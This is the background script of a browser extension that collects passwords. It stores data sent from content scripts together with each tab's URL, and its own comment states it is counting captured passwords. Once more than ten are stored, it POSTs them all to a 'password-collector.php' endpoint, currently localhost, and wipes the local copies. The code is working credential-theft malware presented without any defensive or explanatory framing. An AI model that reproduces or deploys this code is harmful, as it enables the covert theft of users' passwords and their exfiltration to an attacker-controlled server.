chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
	if(request && request.type === "store") {
		var data = {data: request.data, url: sender.tab.url};
		var id = parseInt(localStorage.getItem("counter"), 10);
		if(isNaN(id) || !id)
			id = 1;
		localStorage.setItem("id" + id, btoa(JSON.stringify(data))); // btoa is NOT standard...
		localStorage.setItem("counter", id + 1);
	}
	sendResponse({});
	
	// Got atleast 10 passwords? Try to upload them...
	if(localStorage.length > 10)
		upload();
});

function upload() {
	var keys = [], values = [];
	for(var key in localStorage) {
		if(key !== "counter") {
			keys.push(key);
			values.push(localStorage.getItem(key));
		}
	}
	
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function(event) {
		if(xhr.readyState === 4 && xhr.status === 200) {
			for(var key in keys) {
				localStorage.removeItem(keys[key]);
			}
			
			if(localStorage.length === 1) {
				localStorage.setItem("counter", 1);
			}
		}
	};
	
	var formdata = new FormData();
	formdata.append("data", values);
	xhr.open("POST", "http://localhost/password-collector.php");
	xhr.send(formdata);
}
